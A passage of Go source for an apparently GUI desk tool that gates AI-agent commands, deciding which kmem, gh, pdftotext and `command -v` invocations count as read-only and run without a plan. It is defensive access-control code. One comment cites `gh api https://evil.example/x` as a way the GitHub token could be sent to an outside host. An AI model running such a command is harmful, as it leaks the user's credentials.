		out = append(out, e)
	}
	return out
}

// readOnlyExtraFor: readOnlyExtra plus `kmem --as <own name> brief|rules` for
// session s. Under another name those two mark that name's brief/rules as
// read and stay gated.
func (d *desk) readOnlyExtraFor(s *deskSession) [][]string {
	extra := d.readOnlyExtra()
	if s == nil {
		return extra
	}
	split := d.gateSplitOn()
	if k := d.org.Kmem[s.id]; k != "" {
		for _, sub := range []string{"brief", "rules"} {
			extra = append(extra, []string{"kmem", "--as", k, sub}, []string{"kmem", "--as=" + k, sub})
		}
		if split {
			extra = append(extra, []string{markOwn, k})
		}
	}
	if split && d.kmemFeatureCached(pzLockClosed) {
		extra = append(extra, []string{markPZ})
	}
	return extra
}

func (d *desk) readOnlyDialog() {
	e := widget.NewMultiLineEntry()
	e.SetText(d.app.Preferences().String("extraReadOnly"))
	e.SetPlaceHolder("pzlock status")
	e.SetMinRowsVisible(6)
	explain := widget.NewLabel("With Plan first on, commands that only read run without a plan round. " +
		"Add your own here, one per line: a command that starts with one of these lines counts as read-only " +
		"(\"kmem get\" also lets \"kmem get notes\" through). Only add commands that never change anything. " +
		"kmem lines count only for kmem reads: a kmem write never runs without a plan from this list.")
	explain.Wrapping = fyne.TextWrapWord
	explain.SizeName = theme.SizeNameCaptionText
	dlg := dialog.NewCustomConfirm("Read-only commands", "Save", "Cancel", container.NewBorder(nil, explain, nil, nil, e), func(ok bool) {
		if ok {
			d.app.Preferences().SetString("extraReadOnly", strings.TrimSpace(e.Text))
		}
	}, d.win)
	dlg.Resize(fyne.NewSize(560, 380))
	dlg.Show()
}

// readOnlyKmem: kmem commands that only read (Kmem Lock Audit, 2026-11-22:
// `kmem brief`, `get`, `find`, `show` needed a plan). "kmem fixed TOPIC" sets
// a mark (kmem 1.7.0), so only the bare "kmem fixed" list counts; "kmem
// rules" only marks the rules read. "--as NAME" in front counts the same
// (user 2026-11-23: `kmem --as zomboid find …` needed a plan; brief and rules
// only mark them read for that name, so under --as they count only for the
// session's own name: desk.readOnlyExtraFor adds those two; user 2026-11-23).
//
// kmem takes options anywhere in the line (`kmem rules --as other`), so
// --as is looked for in every word (kmemSplit).
func readOnlyKmem(args []string, split bool) bool {
	as, words, ok := kmemSplit(args)
	if !ok || len(words) == 0 {
		return false
	}
	if as != "" && (words[0] == "brief" || words[0] == "rules") {
		return false
	}
	return readOnlyKmemWords(words, split)
}

// kmemSplit takes `--as NAME` / `--as=NAME` out of a kmem command line,
// wherever it stands. Not ok: --as twice or without a name, or a bare --
// (after which kmem reads options as text).
func kmemSplit(args []string) (as string, words []string, ok bool) {
	seen := false
	for i := 0; i < len(args); i++ {
		a := args[i]
		switch {
		case a == "--":
			return "", nil, false
		case a == "--as" || strings.HasPrefix(a, "--as="):
			if seen {
				return "", nil, false
			}
			seen = true
			if a == "--as" {
				if i+1 >= len(args) {
					return "", nil, false
				}
				i++
				as = args[i]
			} else {
				as = a[len("--as="):]
			}
			if as == "" || strings.HasPrefix(as, "-") {
				return "", nil, false
			}
		default:
			words = append(words, a)
		}
	}
	return as, words, true
}

// kmemValueOpts: kmem read options that take a value; kmemSplitValueOpts
// those the gate split adds (end-check, context --scope).
var (
	kmemValueOpts      = map[string]bool{"--cap": true, "--topic": true, "-n": true, "--token": true}
	kmemSplitValueOpts = map[string]bool{"--scope": true, "--session": true, "--pid": true, "--since": true}
)

// readOnlyKmemWords: a kmem command (without --as) that only reads. Any
// option other than --json, --all and the value options in kmemValueOpts
// makes it a write or unknown. split: the gate split's reads too
// (gatesplit.go).
func readOnlyKmemWords(words []string, split bool) bool {
	if len(words) == 1 && (words[0] == "--version" || words[0] == "--help" || words[0] == "-h") {
		return true
	}
	var ops []string
	for i := 0; i < len(words); i++ {
		w := words[i]
		switch {
		case w == "--json" || w == "--all" || split && w == "--live":
		case kmemValueOpts[w] || split && kmemSplitValueOpts[w]:
			if i+1 >= len(words) || strings.HasPrefix(words[i+1], "-") {
				return false
			}
			i++
		case strings.HasPrefix(w, "--cap=") || strings.HasPrefix(w, "--topic="):
		case strings.HasPrefix(w, "-"):
			return false
		default:
			ops = append(ops, w)
		}
	}
	if len(ops) == 0 {
		return false
	}
	switch ops[0] {
	case "brief", "fixed":
		return len(ops) == 1
	case "rules", "get", "find", "show", "context", "recall", "topics", "version", "help":
		return true
	case "scope":
		return len(ops) == 2 // `kmem scope T` reads; with a list it stores
	case "task":
		return len(ops) >= 2 && (ops[1] == "list" || ops[1] == "check")
	case "handoff":
		return len(ops) >= 2 && (ops[1] == "get" || ops[1] == "list" || ops[1] == "resolve" || ops[1] == "policy" && len(ops) == 2)
	case "trash":
		return len(ops) == 2 && ops[1] == "list"
	}
	if !split {
		return false
	}
	switch ops[0] {
	case "sessions", "features", "end-check":
		return len(ops) == 1
	case "howto":
		return len(ops) == 2 && ops[1] == "list" || len(ops) == 3 && ops[1] == "show"
	case "relate":
		return len(ops) == 2 // `kmem relate A` lists; with B it records
	}
	return false
}

// kmemAllowed: a kmem command runs without a plan. Extra lines starting with
// kmem match on the command's --as name (wherever it stands) and words; a
// line matches a longer command only when that command is a read
// (`kmem handoff policy` doesn't let `kmem handoff policy set …` through).
// A bare `kmem` line (Quill's own windows: kmemSaveExtra) lets every kmem
// command through; the user's Read-only commands never hold one
// (userReadOnlyExtra).
func kmemAllowed(args []string, unknown bool, extra [][]string, split bool) bool {
	for _, e := range extra {
		if len(e) == 1 && e[0] == "kmem" {
			return true
		}
	}
	if unknown {
		return false // {--as,x}, $V: the words kmem sees are not known
	}
	as, words, ok := kmemSplit(args)
	if !ok || len(words) == 0 {
		return false
	}
	for _, e := range extra {
		if len(e) < 2 || e[0] != "kmem" {
			continue
		}
		eas, ew, eok := kmemSplit(e[1:])
		if !eok || eas != as || !hasWordPrefix(words, ew) {
			continue
		}
		if len(words) == len(ew) || readOnlyKmemWords(words, split) {
			return true
		}
	}
	return readOnlyKmem(args, split)
}

// readOnlyCommandV: `command -v|-V NAME…` only looks names up; any other
// `command` runs NAME.
func readOnlyCommandV(args []string) bool {
	lookup := false
	i := 0
	for ; i < len(args) && len(args[i]) > 1 && strings.HasPrefix(args[i], "-"); i++ {
		if args[i] == "--" {
			i++
			break
		}
		if strings.Trim(args[i][1:], "pvV") != "" {
			return false
		}
		lookup = lookup || strings.ContainsAny(args[i], "vV")
	}
	return lookup && i < len(args)
}

// readOnlyPdftotext: `pdftotext [opts] FILE -` writes the text to stdout;
// with any other second file it writes that file.
func readOnlyPdftotext(args []string) bool {
	var files []string
	for i := 0; i < len(args); i++ {
		a := args[i]
		switch {
		case pdftotextFlags[a]:
		case pdftotextValueOpts[a]:
			if i++; i >= len(args) {
				return false
			}
		case a == "-v" || a == "-h" || a == "-help" || a == "--help":
			return len(args) == 1
		case a != "-" && strings.HasPrefix(a, "-"):
			return false
		default:
			files = append(files, a)
		}
	}
	return len(files) == 2 && files[1] == "-"
}

// readOnlyGh: gh commands that only read from GitHub: `gh api` GET requests
// and GraphQL queries, and the view/list verbs in ghReads without --web.
func readOnlyGh(args []string) bool {
	if len(args) == 0 {
		return false
	}
	switch args[0] {
	case "api":
		return readOnlyGhAPI(args[1:])
	case "--version", "version":
		return len(args) == 1
	}
	if len(args) < 2 || !ghReads[args[0]][args[1]] {
		return false
	}
	for _, a := range args[2:] {
		if a == "--web" || strings.HasPrefix(a, "--web=") || strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsRune(a, 'w') {
			return false
		}
	}
	return true
}

func readOnlyGhAPI(args []string) bool {
	var endpoints, fields []string
	for i := 0; i < len(args); i++ {
		a := args[i]
		flag, val, hasVal := a, "", false
		if strings.HasPrefix(a, "--") {
			flag, val, hasVal = strings.Cut(a, "=")
		}
		value := func() (string, bool) {
			if hasVal {
				return val, true
			}
			if i+1 < len(args) {
				i++
				return args[i], true
			}
			return "", false
		}
		switch flag {
		case "--paginate", "--slurp", "-i", "--include", "--silent", "--verbose":
			if hasVal {
				return false
			}
		case "-q", "--jq", "-t", "--template", "--cache", "-p", "--preview":
			if _, ok := value(); !ok {
				return false
			}
		case "-X", "--method":
			if v, ok := value(); !ok || !strings.EqualFold(v, "GET") {
				return false
			}
		case "-H", "--header":
			// Only Accept: another header could override the method.
			v, ok := value()
			if h, _, _ := strings.Cut(v, ":"); !ok || !strings.EqualFold(strings.TrimSpace(h), "Accept") {
				return false
			}
		case "-f", "--raw-field", "-F", "--field":
			v, ok := value()
			if !ok {
				return false
			}
			fields = append(fields, v)
		default:
			if strings.HasPrefix(a, "-") {
				return false // --input and anything unknown
			}
			endpoints = append(endpoints, a)
		}
	}
	if len(endpoints) != 1 {
		return false
	}
	// Only endpoints on the configured GitHub host: gh sends the token to
	// an absolute URL too (`gh api https://evil.example/x`).
	ep := strings.ToLower(endpoints[0])
	if strings.Contains(ep, "://") || strings.HasPrefix(ep, "//") || strings.HasPrefix(ep, "http") || strings.ContainsAny(ep, "@\\") {
		return false
	}
	if ep != "graphql" {
		return len(fields) == 0 // fields make gh send a POST
	}
	// GraphQL: exactly one field, an inline query (never a mutation, no
	// @file upload).
	if len(fields) != 1 {
		return false
	}
	k, v, ok := strings.Cut(fields[0], "=")
	return ok && k == "query" && !strings.Contains(v, "@") && !strings.Contains(strings.ToLower(v), "mutation")
}
